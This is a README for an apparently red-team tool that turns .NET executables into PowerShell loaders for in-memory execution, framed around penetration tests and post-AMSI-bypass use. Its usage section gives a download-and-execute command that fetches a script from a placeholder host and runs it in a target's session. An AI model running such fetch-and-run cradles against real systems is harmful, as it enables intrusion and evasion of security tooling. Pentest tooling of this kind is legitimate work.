# exetops1 #

Use this tool to convert .NET executables into runnable PowerShell scripts.

## When would I use this? ##

When conducting internal penetration tests or red-team exercises, it’s often most convenient to load your favourite .NET tools directly into memory via PowerShell especially once you’ve bypassed AMSI. This utility lets you generate a self-contained .ps1 loader for any .NET executable.

Simply:
1. Upload the generated script to your web host.
2. In your target’s PowerShell session, run:
   
``` powershell
IEX (New-Object Net.WebClient).DownloadString('https://HOST/script.ps1')
Invoke-Filename // the function name can be found within the powershell script
```

## Supported Platforms ##

Windows, Linux, MacOS

## Installation ##

### Via Docker ###

``` bash
git clone https://github.com/ribthegreat99OrN0P/exetops1.git
cd exetops1
docker build -t exetops1 .
```

### Via Source ###

Just download the repo, open with VS22 or Rider and build.
